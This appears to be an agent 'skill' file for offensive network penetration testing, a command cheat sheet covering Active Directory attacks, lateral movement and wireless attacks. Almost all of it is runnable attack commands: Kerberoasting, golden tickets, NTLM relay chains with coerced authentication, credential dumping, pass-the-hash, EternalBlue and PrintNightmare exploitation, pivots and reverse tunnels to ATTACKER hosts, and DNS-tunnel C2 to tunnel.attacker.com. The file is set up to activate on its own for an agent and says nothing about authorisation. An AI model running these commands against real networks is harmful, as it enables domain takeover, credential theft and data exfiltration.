---
name: network-attack
description: Network penetration testing — lateral movement, pivoting, protocol attacks, traffic interception, Active Directory exploitation, wireless attacks
metadata:
  type: offensive
  phase: exploitation
  tools: nmap, responder, impacket, crackmapexec, bloodhound, mitm6, bettercap, chisel, ligolo-ng, kerbrute
kill_chain:
  phase: [recon, actions]
  step: [1, 7]
  attck_tactics: [TA0043, TA0008, TA0007]
depends_on: [recon-osint]
feeds_into: [active-directory-attack, privesc-linux, privesc-windows]
inputs: [network_map, service_list]
outputs: [lateral_movement_path, compromised_hosts]
---

# Network Attack & Lateral Movement

## When to Activate

- Internal network penetration testing
- Active Directory domain compromise
- Lateral movement after initial access
- Network protocol exploitation
- Wireless security assessment
- Traffic interception and manipulation

## Active Directory Attacks

### Enumeration
```bash
# BloodHound collection
bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $DC_IP
# or SharpHound
.\SharpHound.exe -c all --zipfilename output.zip

# LDAP enumeration
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName memberOf

# Kerbrute user enumeration (no auth needed)
kerbrute userenum --dc $DC_IP -d $DOMAIN users.txt

# CrackMapExec
crackmapexec smb $SUBNET/24 -u $USER -p $PASS --shares
crackmapexec smb $DC_IP -u $USER -p $PASS --users
crackmapexec smb $DC_IP -u $USER -p $PASS -M spider_plus
```

### Kerberos Attacks
```bash
# AS-REP Roasting (no pre-auth required)
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC_IP -format hashcat
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# Kerberoasting (any domain user)
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request
hashcat -m 13100 tgs_hashes.txt wordlist.txt

# Silver Ticket (service account NTLM hash)
impacket-ticketer -nthash $NTLM -domain-sid $SID -domain $DOMAIN -spn $SPN $USER

# Golden Ticket (krbtgt hash = domain compromise)
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $SID -domain $DOMAIN Administrator

# Delegation abuse
# Unconstrained: compromise server → extract TGTs from memory
# Constrained: S4U2Self + S4U2Proxy to impersonate any user
# RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-getST -spn $SPN -impersonate Administrator $DOMAIN/$MACHINE\$:$PASS
```

### Credential Harvesting
```bash
# Responder (LLMNR/NBT-NS/mDNS poisoning)
responder -I eth0 -wrf

# NTLM relay
impacket-ntlmrelayx -tf targets.txt -smb2support -i  # interactive shell
impacket-ntlmrelayx -tf targets.txt --delegate-access  # RBCD attack

# mitm6 (IPv6 DNS takeover)
mitm6 -d $DOMAIN
# Combined with ntlmrelayx for delegation

# Credential dumping (post-compromise)
impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET
crackmapexec smb $TARGET -u $USER -p $PASS --lsa
crackmapexec smb $TARGET -u $USER -p $PASS --ntds  # DC only
```

### Privilege Escalation Paths
```
# ACL abuse (BloodHound paths)
# GenericAll → reset password, add to group, write SPN
# GenericWrite → targeted kerberoasting, shadow credentials
# WriteDACL → grant yourself GenericAll
# WriteOwner → take ownership, then WriteDACL

# ADCS (Active Directory Certificate Services)
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -vulnerable
certipy req -u $USER@$DOMAIN -p $PASS -ca $CA -template $TEMPLATE -upn administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

## Lateral Movement

### Techniques
```bash
# PSExec (admin + SMB access)
impacket-psexec $DOMAIN/$USER:$PASS@$TARGET
impacket-psexec $DOMAIN/$USER@$TARGET -hashes :$NTLM

# WMI execution
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET

# Evil-WinRM (WinRM/5985)
evil-winrm -i $TARGET -u $USER -p $PASS

# DCOM execution
impacket-dcomexec $DOMAIN/$USER:$PASS@$TARGET

# Pass-the-Hash
crackmapexec smb $TARGET -u $USER -H $NTLM -x "whoami"

# Overpass-the-Hash (get Kerberos ticket from NTLM)
impacket-getTGT $DOMAIN/$USER -hashes :$NTLM
export KRB5CCNAME=user.ccache
impacket-psexec $DOMAIN/$USER@$TARGET -k -no-pass
```

## Pivoting & Tunneling

```bash
# Chisel (HTTP tunnel)
# Server (attacker): chisel server --reverse -p 8080
# Client (target): chisel client ATTACKER:8080 R:socks

# Ligolo-ng (modern pivoting)
# Proxy (attacker): ligolo-proxy -selfcert -laddr 0.0.0.0:11601
# Agent (target): ligolo-agent -connect ATTACKER:11601 -retry -ignore-cert

# SSH tunneling
ssh -D 9050 user@pivot  # SOCKS proxy
ssh -L 8080:internal:80 user@pivot  # Local port forward
ssh -R 4444:localhost:4444 user@pivot  # Reverse port forward

# proxychains configuration
# socks5 127.0.0.1 1080
proxychains nmap -sT -Pn $INTERNAL_TARGET
```

## Network Protocol Attacks

### ARP Spoofing / MitM
```bash
# Bettercap
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets $TARGET_IP
> arp.spoof on
> net.sniff on
> set http.proxy.sslstrip true
> http.proxy on
```

### DNS Attacks
```bash
# DNS zone transfer
dig axfr @$NS $DOMAIN

# DNS cache poisoning setup
# Requires: predictable TXID or birthday attack on ports
```

### SMB Attacks
```bash
# Null session enumeration
smbclient -L //$TARGET -N
rpcclient -U "" -N $TARGET -c "enumdomusers"

# SMB signing disabled → relay attacks
crackmapexec smb $SUBNET/24 --gen-relay-list relay_targets.txt
```

## Wireless Attacks

### WPA2 Cracking
```bash
# Capture handshake
airmon-ng start wlan0
airodump-ng wlan0mon --bssid $BSSID -c $CHANNEL -w capture
aireplay-ng -0 5 -a $BSSID wlan0mon  # deauth to force handshake

# Crack
hashcat -m 22000 capture.hc22000 wordlist.txt
# or
aircrack-ng -w wordlist.txt capture-01.cap
```

### Evil Twin
```bash
# hostapd-wpe for WPA Enterprise credential capture
# Create AP with same SSID, stronger signal
# Capture RADIUS credentials (MSCHAPv2 → crack with asleap)
```

### WPA Enterprise (802.1X)
```bash
# EAP downgrade attacks
# PEAP relay
# Certificate impersonation
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Captured credentials: asleap -C challenge -R response -W wordlist
```

## Advanced: NTLM Relay Chains

### Relay to LDAP/LDAPS (Shadow Credentials + RBCD)
```bash
# Relay machine account NTLM auth to LDAP for RBCD or shadow creds
# Requires: SMB signing disabled on source, LDAP signing not required on DC

# Setup relay to LDAP with shadow credentials
ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials --shadow-target 'TARGET$'
# Result: certificate for TARGET$ → authenticate as TARGET$ → local admin

# Setup relay to LDAP with RBCD
ntlmrelayx.py -t ldaps://DC_IP --delegate-access --escalate-user YOURUSER
# Result: RBCD configured → S4U2Proxy → impersonate admin on TARGET

# Coerce authentication (trigger the relay)
python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS RELAY_IP TARGET_IP
python3 printerbug.py $DOMAIN/$USER:$PASS@TARGET_IP RELAY_IP
python3 DFSCoerce.py -d $DOMAIN -u $USER -p $PASS RELAY_IP TARGET_IP
```

### Relay to ADCS (ESC8)
```bash
# Relay NTLM auth to ADCS HTTP enrollment endpoint
# Get certificate for relayed machine account → authenticate as that machine

# Terminal 1: Start relay
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Terminal 2: Coerce DC authentication
python3 PetitPotam.py RELAY_IP DC_IP

# Terminal 3: Use captured certificate
certipy auth -pfx dc01.pfx -dc-ip DC_IP
# Returns NT hash of DC machine account → DCSync → full domain compromise
impacket-secretsdump -hashes :DC_HASH $DOMAIN/'DC01$'@DC_IP
```

### Relay to MSSQL
```bash
# Relay to SQL Server for command execution
ntlmrelayx.py -t mssql://SQL_IP -smb2support -q "EXEC xp_cmdshell 'whoami'"

# Chain: coerce → relay to MSSQL → xp_cmdshell → reverse shell
# Or: relay → enable xp_cmdshell → execute payload
ntlmrelayx.py -t mssql://SQL_IP --no-http-server -smb2support \
  -q "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'powershell -enc ...'"
```

### Multi-Relay (Relay to Multiple Targets)
```bash
# Relay single captured auth to multiple services simultaneously
ntlmrelayx.py -tf targets.txt -smb2support -socks
# Opens SOCKS proxy — use proxychains to interact with each relayed session

# Use relayed sessions:
proxychains crackmapexec smb TARGET -u '' -p '' --shares  # uses relayed auth
proxychains impacket-secretsdump $DOMAIN/''@TARGET  # dump via relay
```

## Advanced: IPv6 Attacks

### mitm6 (IPv6 DNS Takeover)
```bash
# Exploit Windows preferring IPv6 over IPv4
# Become the IPv6 DNS server → respond to all queries → capture NTLM auth

# Attack: mitm6 + ntlmrelayx
# Terminal 1: IPv6 DNS poisoning
mitm6 -d $DOMAIN -i eth0

# Terminal 2: Relay captured auth
ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access
# Or: ntlmrelayx.py -6 -t smb://TARGET -smb2support

# What happens:
# 1. mitm6 advertises as IPv6 DNS via DHCPv6
# 2. Victims configure attacker as DNS server
# 3. Victims send DNS queries with NTLM auth (WPAD, etc.)
# 4. ntlmrelayx captures and relays the auth

# WPAD exploitation (automatic proxy discovery)
mitm6 -d $DOMAIN --wpad-auth-url http://ATTACKER_IP/wpad.dat
# Victims auto-authenticate to get proxy config → NTLM captured
```

### Dead Potato (IPv6 DCOM)
```bash
# Local privilege escalation via IPv6 DCOM
# Trigger SYSTEM NTLM auth to localhost via IPv6 DCOM activation
# Relay to local named pipe for impersonation

# Combines: IPv6 preference + DCOM activation + NTLM relay
# Result: SYSTEM token from service account
```

## Advanced: Protocol-Specific Exploitation

### SMB Exploitation
```bash
# EternalBlue (MS17-010) — still found in legacy environments
nmap -p445 --script smb-vuln-ms17-010 $TARGET
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run"

# SMBGhost (CVE-2020-0796) — SMBv3 compression
# Remote code execution via integer overflow in srv2.sys
# Affects Windows 10 1903/1909, Server 2019

# PrintNightmare (CVE-2021-34527)
# Remote code execution via Print Spooler
# Load malicious DLL via AddPrinterDriverEx
impacket-rpcdump $DOMAIN/$USER:$PASS@$TARGET | grep -i print
# If MS-RPRN available:
python3 CVE-2021-34527.py $DOMAIN/$USER:$PASS@$TARGET '\\ATTACKER\share\evil.dll'

# Coerced authentication via MS-RPRN (PrinterBug)
python3 printerbug.py $DOMAIN/$USER:$PASS@$TARGET LISTENER_IP
```

### LDAP Exploitation
```bash
# LDAP passback attack (printer/device with LDAP config)
# 1. Find device with LDAP authentication configured
# 2. Change LDAP server to attacker IP
# 3. Device sends credentials to attacker
nc -lvnp 389  # Capture LDAP bind credentials

# LDAP signing not required → relay attacks possible
# Check: crackmapexec ldap DC_IP -u $USER -p $PASS -M ldap-checker

# LDAP channel binding not required → relay over TLS
# ntlmrelayx.py -t ldaps://DC_IP works without channel binding
```

### RDP Exploitation
```bash
# RDP Man-in-the-Middle (when NLA disabled)
# Use seth or rdp-sec-check to intercept credentials
seth.sh eth0 $VICTIM_IP $DC_IP

# BlueKeep (CVE-2019-0708) — pre-auth RCE
# Affects Windows 7, Server 2008 R2
nmap -p3389 --script rdp-vuln-ms12-020 $TARGET

# RDP session hijacking (requires SYSTEM)
# Hijack disconnected sessions without password
query user  # Find disconnected sessions
tscon SESSION_ID /dest:console  # Hijack as SYSTEM
```

### WinRM Exploitation
```bash
# WinRM (5985/5986) — PowerShell remoting
evil-winrm -i $TARGET -u $USER -p $PASS
evil-winrm -i $TARGET -u $USER -H $NTLM  # Pass-the-hash

# WinRM relay
ntlmrelayx.py -t http://TARGET:5985/wsman -smb2support --no-http-server

# Constrained Language Mode bypass via WinRM
# If AppLocker/WDAC restricts PowerShell locally:
# WinRM to same host bypasses local restrictions
Enter-PSSession -ComputerName localhost -Credential $cred
```

### MSSQL Exploitation
```bash
# MSSQL enumeration
crackmapexec mssql $SUBNET/24 -u $USER -p $PASS

# Command execution via xp_cmdshell
impacket-mssqlclient $DOMAIN/$USER:$PASS@$TARGET
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

# MSSQL link crawling (linked servers)
# Hop through linked SQL servers for lateral movement
SQL> SELECT * FROM openquery("LINKED_SERVER", 'SELECT * FROM openquery("NEXT_SERVER", ''xp_cmdshell whoami'')')

# MSSQL → NTLM capture
SQL> EXEC master..xp_dirtree '\\ATTACKER_IP\share'
# Captures service account NTLM hash

# MSSQL impersonation
SQL> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
SQL> EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami'
```

## Advanced: Segmentation Bypass

### Double Pivoting
```bash
# Scenario: Attacker → DMZ Host → Internal Network → Restricted Segment

# Pivot 1: Attacker → DMZ
# On DMZ host:
chisel client ATTACKER:8080 R:1080:socks

# Pivot 2: DMZ → Internal (through first pivot)
# On internal host (reached via pivot 1):
chisel client DMZ_HOST:9090 R:2080:socks

# Chain proxies:
# proxychains.conf:
# socks5 127.0.0.1 1080  # first pivot
# socks5 127.0.0.1 2080  # second pivot (through first)

# Ligolo-ng (cleaner multi-pivot)
# Proxy: ligolo-proxy -selfcert -laddr 0.0.0.0:11601
# Agent 1 (DMZ): ligolo-agent -connect ATTACKER:11601
# Add route: ip route add 10.10.0.0/16 dev ligolo
# Agent 2 (Internal): ligolo-agent -connect DMZ_IP:11601
# Add route: ip route add 172.16.0.0/16 dev ligolo
```

### VLAN Hopping
```bash
# DTP (Dynamic Trunking Protocol) exploitation
# If switch port in "dynamic desirable" mode:
yersinia dtp -attack 1 -interface eth0
# Creates trunk → access all VLANs

# Double tagging (802.1Q)
# Craft frame with two VLAN tags
# Outer tag = native VLAN (stripped by first switch)
# Inner tag = target VLAN (forwarded by second switch)
scapy: sendp(Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=TARGET_VLAN)/IP(dst=TARGET)/ICMP())
```

### DNS Tunneling for Exfiltration
```bash
# Bypass network segmentation via DNS (usually allowed everywhere)
# Server (attacker): iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
# Client (target): iodine -f -P password tunnel.attacker.com
# Creates tun interface — full IP connectivity over DNS

# dnscat2 (C2 over DNS)
# Server: ruby dnscat2.rb tunnel.attacker.com
# Client: ./dnscat --dns server=tunnel.attacker.com
```
